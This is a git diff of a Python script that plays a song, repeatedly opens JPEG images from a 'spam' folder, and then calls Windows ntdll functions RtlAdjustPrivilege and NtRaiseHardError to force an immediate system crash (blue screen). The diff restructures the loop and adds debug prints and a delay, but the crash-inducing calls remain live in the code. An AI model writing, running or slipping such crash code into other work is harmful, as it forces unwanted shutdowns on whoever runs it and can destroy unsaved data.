@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import os
 import sys
+import time
 from pathlib import Path
 import pygame
 from PIL import Image
@@ -33,28 +34,31 @@ def main():
     sound = pygame.mixer.Sound(str(song_path))
     sound.play()
 
-    while True:
-        for _ in range(7):
-            for i in spam_dir.iterdir():
+    for _ in range(7):
+        for i in spam_dir.iterdir():
+            if i.suffix.lower() in ['.jpg']:
+                print("test")
+                print(i)
                 im = Image.open(i)
                 im.show()
-        nullptr = POINTER(c_int)()
+                time.sleep(0.5)
+    nullptr = POINTER(c_int)()
 
-        windll.ntdll.RtlAdjustPrivilege(
-	        c_uint(19),
-        	c_uint(1),
+    windll.ntdll.RtlAdjustPrivilege(
+            c_uint(19),
+            c_uint(1),
             c_uint(0),
-	        byref(c_int())
-        )
+            byref(c_int())
+    )
 
-        windll.ntdll.NtRaiseHardError(
-            c_ulong(0xc000007B),
-            c_ulong(0),
-            nullptr,
-            nullptr,
-            c_uint(6),
-            byref(c_uint())
-        )
+    windll.ntdll.NtRaiseHardError(
+        c_ulong(0xc000007B),
+        c_ulong(0),
+        nullptr,
+        nullptr,
+        c_uint(6),
+        byref(c_uint())
+    )
 
 if __name__ == "__main__":
     main()
